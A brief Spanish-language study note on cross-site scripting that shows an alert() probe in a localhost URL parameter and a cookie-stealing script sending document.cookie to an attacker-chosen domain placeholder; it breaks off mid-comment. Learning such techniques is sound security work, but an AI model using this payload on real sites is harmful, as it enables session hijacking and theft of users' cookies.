## XSS

Probar XSS desde la URL -> por ejemplo tengo lo siguiente:

```sh
url: localhost:3000/?name=[esto recibe un valor]
```

Pero le podemos pasar el siguiente:
```sh
url: localhost:3000/?name=<script>alert('hola')</script>
```

Esto nos devolverá un alert diciendo "hola" 

Otro ejemplo es que se encuentra en el archivo virus:

```html
<script>document.write('<img src="http://<aca le pasas tu dominio>?c='+document.cookie+'" />')</script>

<!-- como también le puedes pasar una -->
```

